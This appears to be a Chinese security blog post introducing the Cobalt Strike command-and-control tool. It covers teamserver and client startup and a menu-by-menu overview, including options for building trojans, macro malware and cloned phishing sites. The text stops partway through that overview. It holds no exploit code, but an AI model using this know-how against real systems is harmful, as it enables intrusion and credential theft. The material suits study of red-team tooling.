<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>CobaltStrike | 10fteam</title>
  <meta name="keywords" content=" 工具 , 知识 ">
  <meta name="description" content="CobaltStrike | 10fteam">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="0x00 各类文件 .o：目标文件，相当于windows的.obj文件 .so：共享对象，shared object，用于动态连接，类似.dll .a：静态文件，多个.o组成，用于静态连接  0x01 查看.so文件 nm -D xx.so objdump -Tt xx.so  0x02 创建.so文件并调用 aaa.c void aaa_say() {  printf(&amp;quot;aaa say">
<meta name="keywords" content="知识,Linux">
<meta property="og:type" content="article">
<meta property="og:title" content="Linux-.so文件">
<meta property="og:url" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;Linux-so%E6%96%87%E4%BB%B6&#x2F;index.html">
<meta property="og:site_name" content="10fteam">
<meta property="og:description" content="0x00 各类文件 .o：目标文件，相当于windows的.obj文件 .so：共享对象，shared object，用于动态连接，类似.dll .a：静态文件，多个.o组成，用于静态连接  0x01 查看.so文件 nm -D xx.so objdump -Tt xx.so  0x02 创建.so文件并调用 aaa.c void aaa_say() {  printf(&amp;quot;aaa say">
<meta property="og:locale" content="default">
<meta property="og:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;Linux-so%E6%96%87%E4%BB%B6&#x2F;1.png">
<meta property="og:updated_time" content="2020-01-06T04:18:03.388Z">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https:&#x2F;&#x2F;10fteam.github.io&#x2F;Linux-so%E6%96%87%E4%BB%B6&#x2F;1.png">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.0.1" rel="stylesheet">

<link href="/css/hl_theme/atom-light.css?v=1.0.1" rel="stylesheet">

<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">

<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>

<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>



<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.0.1" ></script>

</head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="false">
  <input class="theme_blog_path" value="">
</div>

<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>10fteam</span>
</div>

<div class="icon">
    
</div>




<ul>
    <li><div class="all active">全部文章<small>(47)</small></div></li>
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    
    
    
    
    
    
    
    </div>
    <div><a  class="friends">传送门</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="47">

<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        安全链接
        <i class="back-title-list"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="https://www.baidu.com/">百度一下</a></li>
            
            <li><a target="_blank" href="https://github.com/">GitHub</a></li>
            
            <li><a target="_blank" href="https://www.freebuf.com/">freebuf</a></li>
            
            <li><a target="_blank" href="https://www.anquanke.com/">安全客</a></li>
            
            <li><a target="_blank" href="https://xz.aliyun.com/">先知社区</a></li>
            
            <li><a target="_blank" href="https://www.pediy.com/">看雪</a></li>
            
            <li><a target="_blank" href="https://www.52pojie.cn/">吾爱破解</a></li>
            
            <li><a target="_blank" href="https://bbs.ichunqiu.com/portal.php">I春秋</a></li>
            
            <li><a target="_blank" href="https://ipcmen.com/">Linux命令</a></li>
            
            <li><a target="_blank" href="https://start.me/p/X20Apn">安全导航1</a></li>
            
            <li><a target="_blank" href="https://www.shentoushi.top/">安全导航2</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <form onkeydown="if(event.keyCode==13){return false;}">
        <input class="search" type="text" placeholder="Search..." autocomplete="off"id="local-search-input" >
        <i class="cross"></i>
        <span>
            <label for="tagswitch">Tags:</label>
            <input id="tagswitch" type="checkbox" style="display: none" />
            <i id="tagsWitchIcon"></i>
        </span>
    </form>
    <div class="tags-list">
    
    <li class="article-tag-list-item">
        <a class="color4">CTF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">encrypt_decrypt</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">RSA</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">工具</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">知识</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">HTB</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶机</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">writeup</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">Linux</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">信息搜集</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">安全加固</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">入侵检测</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">应急响应</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PHP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">代码审计</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">POC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">EXP</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">PWN</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color2">python</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">注入</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">Struts2</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">weblogic</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">漏洞</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">backdoor</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">help</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">shell</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">靶场</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">vulnhub</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">僵尸网络</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">内网渗透</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color1">share</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">提权</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color4">WAF</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color5">MISC</a>
    </li>
    
    <li class="article-tag-list-item">
        <a class="color3">逆向</a>
    </li>
    
    <div class="clearfix"></div>
</div>

    
    <nav id="title-list-nav">
        
        <a  class=""
           href="/2019%E7%BA%A2%E5%B8%BD%E6%9D%AF%E4%B9%8B%E6%81%B6%E8%87%AD%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85/"
           data-tag="CTF,encrypt_decrypt"
           data-author="" >
            <span class="post-title" title="2019红帽杯之恶臭的数据包">2019红帽杯之恶臭的数据包</span>
            <span class="post-date" title="2019-12-04 21:47:23">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/CTF-RSA/"
           data-tag="CTF,RSA"
           data-author="" >
            <span class="post-title" title="CTF_RSA">CTF_RSA</span>
            <span class="post-date" title="2019-11-30 20:07:30">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/CTF%E4%B8%8Ewireshark/"
           data-tag="CTF"
           data-author="" >
            <span class="post-title" title="CTF与wireshark">CTF与wireshark</span>
            <span class="post-date" title="2020-01-01 21:28:37">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/CobaltStrike/"
           data-tag="工具,知识"
           data-author="" >
            <span class="post-title" title="CobaltStrike">CobaltStrike</span>
            <span class="post-date" title="2020-01-04 19:01:40">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/DNS%E8%AE%B0%E5%BD%95/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="DNS记录">DNS记录</span>
            <span class="post-date" title="2019-12-06 22:37:01">2019/12/06</span>
        </a>
        
        <a  class=""
           href="/HTB-Wall/"
           data-tag="HTB,靶机,writeup"
           data-author="" >
            <span class="post-title" title="HTB-Wall">HTB-Wall</span>
            <span class="post-date" title="2019-12-17 22:06:37">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/Linux-so%E6%96%87%E4%BB%B6/"
           data-tag="知识,Linux"
           data-author="" >
            <span class="post-title" title="Linux-.so文件">Linux-.so文件</span>
            <span class="post-date" title="2020-01-06 11:02:40">2020/01/06</span>
        </a>
        
        <a  class=""
           href="/Linux-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86-%E5%AE%89%E5%85%A8%E5%8A%A0%E5%9B%BA-%E5%85%A5%E4%BE%B5%E6%A3%80%E6%B5%8B-%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"
           data-tag="Linux,信息搜集,安全加固,入侵检测,应急响应"
           data-author="" >
            <span class="post-title" title="Linux_信息搜集_安全加固_入侵检测_应急响应——未完待续">Linux_信息搜集_安全加固_入侵检测_应急响应——未完待续</span>
            <span class="post-date" title="2019-12-03 22:17:19">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="OGNL表达式——未完待续">OGNL表达式——未完待续</span>
            <span class="post-date" title="2019-12-20 15:38:08">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A11/"
           data-tag="PHP,代码审计"
           data-author="" >
            <span class="post-title" title="PHP代码审计学习1">PHP代码审计学习1</span>
            <span class="post-date" title="2019-12-12 15:39:42">2019/12/12</span>
        </a>
        
        <a  class=""
           href="/PHP%E5%B0%8F%E7%9F%A5%E8%AF%86/"
           data-tag="知识,PHP"
           data-author="" >
            <span class="post-title" title="PHP小知识">PHP小知识</span>
            <span class="post-date" title="2020-01-01 23:49:08">2020/01/01</span>
        </a>
        
        <a  class=""
           href="/POC&EXP_Write/"
           data-tag="POC,EXP"
           data-author="" >
            <span class="post-title" title="POC&amp;EXP_Write">POC&amp;EXP_Write</span>
            <span class="post-date" title="2019-11-30 00:45:27">2019/11/30</span>
        </a>
        
        <a  class=""
           href="/PWN%E4%B9%8B%E7%A8%8B%E5%BA%8F%E5%B8%B8%E7%94%A8%E7%9A%84%E4%BF%9D%E6%8A%A4%E6%9C%BA%E5%88%B6/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN之程序常用的保护机制">PWN之程序常用的保护机制</span>
            <span class="post-date" title="2019-12-05 15:59:05">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/PWN%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/"
           data-tag="CTF,PWN"
           data-author="" >
            <span class="post-title" title="PWN基础知识——未完待续">PWN基础知识——未完待续</span>
            <span class="post-date" title="2019-12-05 18:55:42">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/PWN%E5%AD%A6%E4%B9%A0/"
           data-tag="PWN"
           data-author="" >
            <span class="post-title" title="PWN学习——未完待续">PWN学习——未完待续</span>
            <span class="post-date" title="2019-12-04 22:13:47">2019/12/04</span>
        </a>
        
        <a  class=""
           href="/Python-requests/"
           data-tag="python"
           data-author="" >
            <span class="post-title" title="Python_requests模块">Python_requests模块</span>
            <span class="post-date" title="2019-11-29 19:05:39">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/Python%E5%9F%BA%E7%A1%80/"
           data-tag="知识,python"
           data-author="" >
            <span class="post-title" title="Python基础——未完待续">Python基础——未完待续</span>
            <span class="post-date" title="2019-12-23 23:14:43">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/SQL%E6%B3%A8%E5%85%A5/"
           data-tag="注入"
           data-author="" >
            <span class="post-title" title="SQL注入——未完待续">SQL注入——未完待续</span>
            <span class="post-date" title="2019-12-01 21:45:31">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/Struts2%E6%BC%8F%E6%B4%9E%E5%BA%8F%E5%88%97S2-001/"
           data-tag="Struts2"
           data-author="" >
            <span class="post-title" title="Struts2漏洞序列S2-001">Struts2漏洞序列S2-001</span>
            <span class="post-date" title="2019-12-20 14:38:43">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/Weblogic%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E/"
           data-tag="weblogic,漏洞"
           data-author="" >
            <span class="post-title" title="Weblogic序列漏洞">Weblogic序列漏洞</span>
            <span class="post-date" title="2019-12-25 11:09:00">2019/12/25</span>
        </a>
        
        <a  class=""
           href="/WordPress%E5%AE%89%E5%85%A8%E9%85%8D%E7%BD%AE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="WordPress安全配置——未完待续">WordPress安全配置——未完待续</span>
            <span class="post-date" title="2019-12-12 15:30:50">2019/12/12</span>
        </a>
        
        <a  class=""
           href="/XSS/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="XSS——未完待续">XSS——未完待续</span>
            <span class="post-date" title="2019-12-18 13:24:05">2019/12/18</span>
        </a>
        
        <a  class=""
           href="/backdoors/"
           data-tag="backdoor"
           data-author="" >
            <span class="post-title" title="backdoors——未完待续">backdoors——未完待续</span>
            <span class="post-date" title="2019-12-14 18:13:22">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/docker%E4%BD%BF%E7%94%A8/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="docker使用">docker使用</span>
            <span class="post-date" title="2019-12-20 15:17:33">2019/12/20</span>
        </a>
        
        <a  class=""
           href="/hashcat/"
           data-tag="工具"
           data-author="" >
            <span class="post-title" title="hashcat">hashcat</span>
            <span class="post-date" title="2019-12-26 11:11:09">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/hexo-help/"
           data-tag="help"
           data-author="" >
            <span class="post-title" title="hexo_help">hexo_help</span>
            <span class="post-date" title="2019-11-29 16:45:43">2019/11/29</span>
        </a>
        
        <a  class=""
           href="/shell/"
           data-tag="shell"
           data-author="" >
            <span class="post-title" title="shell">shell</span>
            <span class="post-date" title="2020-01-04 16:49:08">2020/01/04</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8B21LTLTR-Scene-1/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之21LTLTR_Scene_1">vulnhub之21LTLTR_Scene_1</span>
            <span class="post-date" title="2019-12-28 21:03:12">2019/12/28</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBitbot-VulnVM-disk1/"
           data-tag="靶场,vulnhub,僵尸网络"
           data-author="" >
            <span class="post-title" title="vulnhub之Bitbot.VulnVM-disk1">vulnhub之Bitbot.VulnVM-disk1</span>
            <span class="post-date" title="2019-12-30 00:22:42">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BBrainpan-III/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Brainpan_III">vulnhub之Brainpan_III</span>
            <span class="post-date" title="2019-12-30 23:32:53">2019/12/30</span>
        </a>
        
        <a  class=""
           href="/vulnhub%E4%B9%8BOs-hackNos-3/"
           data-tag="靶场,vulnhub"
           data-author="" >
            <span class="post-title" title="vulnhub之Os-hackNos-3">vulnhub之Os-hackNos-3</span>
            <span class="post-date" title="2020-01-02 13:21:15">2020/01/02</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透——未完待续">内网渗透——未完待续</span>
            <span class="post-date" title="2019-12-01 21:19:06">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B9%8BEmpire/"
           data-tag="内网渗透"
           data-author="" >
            <span class="post-title" title="内网渗透之Empire">内网渗透之Empire</span>
            <span class="post-date" title="2019-12-19 11:42:47">2019/12/19</span>
        </a>
        
        <a  class=""
           href="/%E5%90%84%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E6%BC%8F%E6%B4%9E/"
           data-tag="漏洞"
           data-author="" >
            <span class="post-title" title="各端口服务漏洞——未完待续">各端口服务漏洞——未完待续</span>
            <span class="post-date" title="2019-12-17 20:27:22">2019/12/17</span>
        </a>
        
        <a  class=""
           href="/%E5%9B%BE%E6%96%87%E5%B9%B6%E8%8C%82/"
           data-tag="share"
           data-author="" >
            <span class="post-title" title="图文并茂">图文并茂</span>
            <span class="post-date" title="2019-12-02 17:18:16">2019/12/02</span>
        </a>
        
        <a  class=""
           href="/%E5%AF%BB%E6%89%BE%E7%BD%91%E7%AB%99%E7%9A%84%E7%9C%9F%E5%AE%9EIP/"
           data-tag="信息搜集"
           data-author="" >
            <span class="post-title" title="寻找网站的真实IP">寻找网站的真实IP</span>
            <span class="post-date" title="2019-12-03 13:41:27">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83/"
           data-tag="提权"
           data-author="" >
            <span class="post-title" title="提权——未完待续">提权——未完待续</span>
            <span class="post-date" title="2019-12-01 21:21:55">2019/12/01</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8BLinux-dirtycow/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之Linux-dirtycow">提权之Linux-dirtycow</span>
            <span class="post-date" title="2019-12-23 20:26:44">2019/12/23</span>
        </a>
        
        <a  class=""
           href="/%E6%8F%90%E6%9D%83%E4%B9%8Bsudo-ed/"
           data-tag="Linux,提权"
           data-author="" >
            <span class="post-title" title="提权之sudo_ed">提权之sudo_ed</span>
            <span class="post-date" title="2019-12-14 17:54:23">2019/12/14</span>
        </a>
        
        <a  class=""
           href="/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8F/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="正则表达式">正则表达式</span>
            <span class="post-date" title="2019-12-10 21:08:11">2019/12/10</span>
        </a>
        
        <a  class=""
           href="/%E7%AB%AF%E5%8F%A3%E8%BD%AC%E5%8F%91/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="端口转发">端口转发</span>
            <span class="post-date" title="2020-01-05 02:38:08">2020/01/05</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8Bsafedog/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之safedog">绕WAF之safedog</span>
            <span class="post-date" title="2019-12-27 20:28:35">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E4%B9%8B%E5%88%86%E5%9D%97%E4%BC%A0%E8%BE%93/"
           data-tag="WAF"
           data-author="" >
            <span class="post-title" title="绕WAF之分块传输">绕WAF之分块传输</span>
            <span class="post-date" title="2019-12-27 09:24:52">2019/12/27</span>
        </a>
        
        <a  class=""
           href="/%E7%BB%95WAF%E5%9F%BA%E7%A1%80/"
           data-tag="知识,WAF"
           data-author="" >
            <span class="post-title" title="绕WAF基础">绕WAF基础</span>
            <span class="post-date" title="2019-12-03 11:37:29">2019/12/03</span>
        </a>
        
        <a  class=""
           href="/%E8%84%91%E5%9B%BE/"
           data-tag="知识"
           data-author="" >
            <span class="post-title" title="脑图">脑图</span>
            <span class="post-date" title="2019-12-05 19:24:56">2019/12/05</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳一">脱壳一</span>
            <span class="post-date" title="2019-12-26 00:13:05">2019/12/26</span>
        </a>
        
        <a  class=""
           href="/%E8%84%B1%E5%A3%B3%E4%BA%8C/"
           data-tag="MISC,逆向"
           data-author="" >
            <span class="post-title" title="脱壳二">脱壳二</span>
            <span class="post-date" title="2020-01-01 15:51:38">2020/01/01</span>
        </a>
        
    </nav>
</div>
    </div>
    <div class="hide-list">
        <div class="semicircle">
            <div class="brackets first"><</div>
            <div class="brackets">&gt;</div>
        </div>
    </div>
</aside>
<div class="post">
    <div class="pjax">
        <article id="post-CobaltStrike" class="article article-type-post" itemscope itemprop="blogPost">
    
        <h1 class="article-title">CobaltStrike</h1>
    
    <div class="article-meta">
        
        
        
        
        <span class="tag">
            
            <a class="color3">工具</a>
            
            <a class="color3">知识</a>
            
        </span>
        
    </div>
    <div class="article-meta">
        
        创建时间:<time class="date" title='更新时间: 2020-01-05 02:45:49'>2020-01-04 19:01</time>
        
    </div>
    <div class="article-meta">
        
        
        <span id="busuanzi_container_page_pv">
            阅读:<span id="busuanzi_value_page_pv">
                <span class="count-comment">
                    <span class="spinner">
                      <div class="cube1"></div>
                      <div class="cube2"></div>
                    </span>
                </span>
            </span>
        </span>
        
        
    </div>
    
    <div class="toc-ref">
    
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00-CobaltStrike"><span class="toc-text">0x00 CobaltStrike</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x10-Linux下启动CobaltStrike的服务器与客户端"><span class="toc-text">0x10 Linux下启动CobaltStrike的服务器与客户端</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x20-各种参数"><span class="toc-text">0x20 各种参数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x21-CobaltStrike"><span class="toc-text">0x21 CobaltStrike</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x22-View"><span class="toc-text">0x22 View</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x23-Attacks"><span class="toc-text">0x23 Attacks</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x24-Reporting"><span class="toc-text">0x24 Reporting</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x25-Help"><span class="toc-text">0x25 Help</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x26-各按钮快捷键"><span class="toc-text">0x26 各按钮快捷键</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x30-基本使用"><span class="toc-text">0x30 基本使用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x31-创建监听器"><span class="toc-text">0x31 创建监听器</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x32-创建木马文件"><span class="toc-text">0x32 创建木马文件</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x33-开启web服务"><span class="toc-text">0x33 开启web服务</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x34-运行木马"><span class="toc-text">0x34 运行木马</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x35-导出报告"><span class="toc-text">0x35 导出报告</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x40-Beacon"><span class="toc-text">0x40 Beacon</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0x41-查看帮助"><span class="toc-text">0x41 查看帮助</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x42-具体命令的帮助信息"><span class="toc-text">0x42 具体命令的帮助信息</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x43-MSF"><span class="toc-text">0x43 MSF</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x50-browserpivot"><span class="toc-text">0x50 browserpivot</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x60-Socks代理"><span class="toc-text">0x60 Socks代理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x70-powershell-import"><span class="toc-text">0x70 powershell-import</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x80-dll文件或ps文件"><span class="toc-text">0x80 dll文件或ps文件</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x90-内网渗透"><span class="toc-text">0x90 内网渗透</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xA0-各种扫描"><span class="toc-text">0xA0 各种扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#0xA1-存活主机扫描"><span class="toc-text">0xA1 存活主机扫描</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0xA2-端口扫描"><span class="toc-text">0xA2 端口扫描</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0xFF-参考"><span class="toc-text">0xFF 参考</span></a></li></ol>
    
<style>
    .left-col .switch-btn,
    .left-col .switch-area {
        display: none;
    }
    .toc-level-3 i,
    .toc-level-3 ol {
        display: none !important;
    }
</style>
</div>
    
    <div class="article-entry" itemprop="articleBody">
      
        <h2 id="0x00-CobaltStrike"><a href="#0x00-CobaltStrike" class="headerlink" title="0x00 CobaltStrike"></a>0x00 <a href="https://www.cobaltstrike.com/" target="_blank" rel="noopener">CobaltStrike</a></h2><ol>
<li>一款渗透测试工具，简称CS。</li>
<li>目录结构：</li>
<li><img src="/CobaltStrike/5.png" alt></li>
<li>agscript #扩展应用的脚本</li>
<li>c2lint #用于检查profile的错误异常</li>
<li>cobaltstrike #Linux客户端文件</li>
<li>cobaltstrike.auth #</li>
<li>cobaltstrike.exe #</li>
<li>cobaltstrike.jar #客户端程序</li>
<li>cobaltstrike.store #</li>
<li>license.pdf #许可证</li>
<li>logs #日志</li>
<li>peclone #</li>
<li>teamserver #服务端文件</li>
<li>teamserver_win.bat #windows服务端</li>
<li>third-party #第三方工具</li>
<li>update #（Linux）用于更新CS</li>
<li>update.jar #用于更新CS</li>
</ol>
<h2 id="0x10-Linux下启动CobaltStrike的服务器与客户端"><a href="#0x10-Linux下启动CobaltStrike的服务器与客户端" class="headerlink" title="0x10 Linux下启动CobaltStrike的服务器与客户端"></a>0x10 Linux下启动CobaltStrike的服务器与客户端</h2><ol>
<li>工具分服务端与客户端，关键文件：teamserver和cobaltstrike</li>
<li>服务端启动</li>
<li>./teamserver 当前主机的ip 密码 #<a href="https://github.com/ryanohoro/csbruter" target="_blank" rel="noopener">CS爆破脚本</a></li>
<li><img src="/CobaltStrike/1.png" alt></li>
<li>Linux本地客户端启动</li>
<li>./cobaltstrike（或者： java -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar）</li>
<li>host即服务端的ip，port默认为50050,user随意，password就是前面teamserver启动设置的密码</li>
<li><img src="/CobaltStrike/2.png" alt></li>
<li>远程客户端启动</li>
<li><img src="/CobaltStrike/3.png" alt></li>
<li><img src="/CobaltStrike/4.png" alt></li>
<li><strong>注意</strong></li>
<li>50050是服务端默认端口，可以修改teamserver文件来修改端口</li>
<li><img src="/CobaltStrike/6.png" alt></li>
</ol>
<h2 id="0x20-各种参数"><a href="#0x20-各种参数" class="headerlink" title="0x20 各种参数"></a>0x20 各种参数</h2><h3 id="0x21-CobaltStrike"><a href="#0x21-CobaltStrike" class="headerlink" title="0x21 CobaltStrike"></a>0x21 CobaltStrike</h3><ol>
<li>New Connection   # 新建连接，支持连接多个服务器端</li>
<li>Preferences   # 设置Cobal Strike界面、控制台、以及输出报告样式、TeamServer连接记录</li>
<li>Visualization   # 主要展示输出结果的视图</li>
<li>VPN Interfaces   # 设置VPN接口</li>
<li>Listenrs   # 创建监听器</li>
<li>Script Manager   # 脚本管理，可以通过AggressorScripts脚本来加强自身，能够扩展菜单栏，Beacon命令行，提权脚本等</li>
<li>Close   # 退出连接</li>
</ol>
<h3 id="0x22-View"><a href="#0x22-View" class="headerlink" title="0x22 View"></a>0x22 View</h3><ol>
<li>Applications   # 显示受害主机的应用信息</li>
<li>Credentials   # 显示所有以获取的受害主机的凭证，如hashdump、Mimikatz</li>
<li>Downloads   # 查看已下载文件</li>
<li>Event Log   # 主机上线记录以及团队协作聊天记录</li>
<li>Keystrokes   # 查看键盘记录结果</li>
<li>Proxy Pivots   # 查看代理模块</li>
<li>Screenshots   # 查看所有屏幕截图</li>
<li>Script Console   # 加载第三方脚本以增强功能 </li>
<li>Targets   # 显示所有受害主机</li>
<li>Web Log    # 所有Web服务的日志</li>
</ol>
<h3 id="0x23-Attacks"><a href="#0x23-Attacks" class="headerlink" title="0x23 Attacks"></a>0x23 Attacks</h3><p><strong>Packages</strong></p>
<ol>
<li>HTML Application   # 生成(executable/VBA/powershell)这三种原理实现的恶意HTA木马文件</li>
<li>MS Office Macro   # 生成office宏病毒文件</li>
<li>Payload Generator   # 生成各种语言版本的payload</li>
<li>USB/CD AutoPlay   # 生成利用自动播放运行的木马文件</li>
<li>Windows Dropper   # 捆绑器能够对任意的正常文件进行捆绑(免杀效果差)</li>
<li>Windows Executable   # 生成可执行exe木马</li>
<li>Windows Executable(Stageless)   # 生成无状态的可执行exe木马</li>
</ol>
<p><strong>Web Drive-by</strong></p>
<ol>
<li>Manage   # 对开启的web服务进行管理</li>
<li>Clone Site   # 克隆网站，可以记录受害者提交的数据</li>
<li>Host File   # 提供文件下载，可以选择Mime类型</li>
<li>Scripted Web Delivery   # 为payload提供web服务以便下载和执行，类似于Metasploit的web_delivery </li>
<li>Signed Applet Attack   # 使用java自签名的程序进行钓鱼攻击(该方法已过时)</li>
